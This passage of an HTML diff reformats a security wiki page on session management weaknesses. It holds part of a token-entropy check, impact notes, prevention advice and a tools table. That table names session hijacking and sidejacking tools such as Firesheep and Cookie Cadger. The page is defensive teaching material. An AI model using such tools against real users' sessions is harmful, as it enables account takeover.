 </span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Analyze</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">token</span> <span style="color:#a6e22e">randomness</span>
@@ -2136,12 +1941,8 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#34;Shannon Entropy: {entropy:.2f} bits&#34;</span>)  
 </span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Good</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">tokens</span> <span style="color:#a6e22e">should</span> <span style="color:#a6e22e">have</span> <span style="color:#a6e22e">high</span> <span style="color:#a6e22e">entropy</span> (<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">4.0</span> <span style="color:#a6e22e">bits</span> <span style="color:#a6e22e">per</span> <span style="color:#a6e22e">character</span>)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">entropy</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4.0</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;[!] Low entropy detected - tokens may be predictable&#34;</span>)
-</span></span></code></pre></div><hr>
-<h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;[!] Low entropy detected - tokens may be predictable&#34;</span>)</span></span></code></pre></div><hr>
+<h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li>Hijacking a valid session allows an attacker to access a user&rsquo;s account without knowing their credentials, enabling them to view sensitive information, modify account settings, and perform actions as the legitimate user.</li>
 <li>Session fixation can lead to complete account takeover when the application fails to issue a new session identifier after successful authentication.</li>
@@ -2155,10 +1956,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Large-scale exploitation of session management flaws can result in widespread account compromise, affecting multiple users without requiring credential theft.</li>
 </ul>
 <hr>
-<h2 id="prevention">
-  Prevention
-  <a class="anchor" href="#prevention">#</a>
-</h2>
+<h2 id="prevention">Prevention<a class="anchor" href="#prevention">#</a></h2>
 <ul>
 <li>Regenerate session ID after authentication — call <code>session_regenerate_id(true)</code> in PHP, <code>session.invalidate()</code> in Java, <code>session.regenerateId()</code> in Express immediately after login.</li>
 <li>Set all session cookie security flags — <code>Secure</code> for HTTPS-only, <code>HttpOnly</code> to block JavaScript access, <code>SameSite=Strict</code> to prevent CSRF attacks.</li>
@@ -2173,73 +1971,67 @@ https://github.com/alex-shpak/hugo-book
 <li>Use JWT securely if stateless — sign with RS256, set short expiration (15 minutes), implement token refresh mechanism, maintain revocation list.</li>
 </ul>
 <hr>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <table>
-<thead>
-<tr>
-<th><strong>Tool</strong></th>
-<th><strong>Purpose</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><a href="https://portswigger.net/burp/documentation/desktop/tools/sequencer" target="_blank" rel="noreferrer noopener nofollow">Burp Suite Sequencer</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Session token entropy analysis</td>
-</tr>
-<tr>
-<td><a href="https://www.zaproxy.org/" target="_blank" rel="noreferrer noopener nofollow">OWASP ZAP</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Session management vulnerability scanning</td>
-</tr>
-<tr>
-<td><a href="https://github.com/Moustachauve/cookie-editor" target="_blank" rel="noreferrer noopener nofollow">Cookie-Editor</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Browser extension for cookie manipulation</td>
-</tr>
-<tr>
-<td><a href="https://github.com/ticarpi/jwt_tool" target="_blank" rel="noreferrer noopener nofollow">JWT_Tool</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>JWT security testing and exploitation</td>
-</tr>
-<tr>
-<td><a href="https://github.com/dnet/sessionprobe" target="_blank" rel="noreferrer noopener nofollow">sessionprobe</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Session security testing toolkit</td>
-</tr>
-<tr>
-<td><a href="https://www.wireshark.org/" target="_blank" rel="noreferrer noopener nofollow">Wireshark</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Network traffic analysis for session sniffing</td>
-</tr>
-<tr>
-<td><a href="https://www.telerik.com/fiddler" target="_blank" rel="noreferrer noopener nofollow">Fiddler</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>HTTP/HTTPS traffic inspection</td>
-</tr>
-<tr>
-<td><a href="https://mitmproxy.org/" target="_blank" rel="noreferrer noopener nofollow">mitmproxy</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Interactive HTTPS proxy for session analysis</td>
-</tr>
-<tr>
-<td><a href="https://cookiecadger.com/" target="_blank" rel="noreferrer noopener nofollow">Cookie Cadger</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Session hijacking and sidejacking tool</td>
-</tr>
-<tr>
-<td><a href="https://github.com/codebutler/firesheep" target="_blank" rel="noreferrer noopener nofollow">Firesheep</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Session hijacking demonstration tool</td>
-</tr>
-<tr>
-<td><a href="http://hamster.erratasec.com/" target="_blank" rel="noreferrer noopener nofollow">Hamster &amp; Ferret</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Sidejacking and session hijacking suite</td>
-</tr>
-<tr>
-<td><a href="https://portswigger.net/burp/documentation/collaborator" target="_blank" rel="noreferrer noopener nofollow">Burp Collaborator</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Out-of-band session token leakage detection</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th><strong>Tool</strong></th>
+					<th><strong>Purpose</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><a href="https://portswigger.net/burp/documentation/desktop/tools/sequencer" target="_blank" rel="noreferrer noopener nofollow">Burp Suite Sequencer</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Session token entropy analysis</td>
+			</tr>
+			<tr>
+					<td><a href="https://www.zaproxy.org/" target="_blank" rel="noreferrer noopener nofollow">OWASP ZAP</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Session management vulnerability scanning</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/Moustachauve/cookie-editor" target="_blank" rel="noreferrer noopener nofollow">Cookie-Editor</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Browser extension for cookie manipulation</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/ticarpi/jwt_tool" target="_blank" rel="noreferrer noopener nofollow">JWT_Tool</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>JWT security testing and exploitation</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/dnet/sessionprobe" target="_blank" rel="noreferrer noopener nofollow">sessionprobe</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Session security testing toolkit</td>
+			</tr>
+			<tr>
+					<td><a href="https://www.wireshark.org/" target="_blank" rel="noreferrer noopener nofollow">Wireshark</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Network traffic analysis for session sniffing</td>
+			</tr>
+			<tr>
+					<td><a href="https://www.telerik.com/fiddler" target="_blank" rel="noreferrer noopener nofollow">Fiddler</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>HTTP/HTTPS traffic inspection</td>
+			</tr>
+			<tr>
+					<td><a href="https://mitmproxy.org/" target="_blank" rel="noreferrer noopener nofollow">mitmproxy</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Interactive HTTPS proxy for session analysis</td>
+			</tr>
+			<tr>
+					<td><a href="https://cookiecadger.com/" target="_blank" rel="noreferrer noopener nofollow">Cookie Cadger</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Session hijacking and sidejacking tool</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/codebutler/firesheep" target="_blank" rel="noreferrer noopener nofollow">Firesheep</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Session hijacking demonstration tool</td>
+			</tr>
+			<tr>
+					<td><a href="http://hamster.erratasec.com/" target="_blank" rel="noreferrer noopener nofollow">Hamster &amp; Ferret</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Sidejacking and session hijacking suite</td>
+			</tr>
+			<tr>
+					<td><a href="https://portswigger.net/burp/documentation/collaborator" target="_blank" rel="noreferrer noopener nofollow">Burp Collaborator</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Out-of-band session token leakage detection</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="good-to-read">
-  Good to Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good to Read<a class="anchor" href="#good-to-read">#</a></h2>
 <ul>
 <li><a href="https://auth0.com/docs/manage-users/sessions" target="_blank" rel="noreferrer noopener nofollow">Auth0 - Session Management Best Practices</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://hackerone.com/reports/716576" target="_blank" rel="noreferrer noopener nofollow">HackerOne Report #716576</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> - Session Fixation in OAuth</li>
@@ -2248,10 +2040,7 @@ https://github.com/alex-shpak/hugo-book
 <li><a href="https://github.com/OWASP/ASVS/raw/v5.0.0/5.0/OWASP_Application_Security_Verification_Standard_5.0.0_en.pdf" target="_blank" rel="noreferrer noopener nofollow">OWASP ASVS Session Requirements</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://pages.nist.gov/800-63-4/sp800-63b/session/" target="_blank" rel="noreferrer noopener nofollow">NIST 800-63B Session Management</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
 <ul>
 <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/README" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/README</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -2268,49 +2057,62 @@ https://github.com/alex-shpak/hugo-book
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Session%20Management%20Weaknesses.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Server-Side Template Injection (SSTI)</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Software-Data-Integrity-Failures/" class="flex align-center">
+        <span>Software &amp; Data Integrity Failures</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2397,15 +2199,24 @@ https://github.com/alex-shpak/hugo-book
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
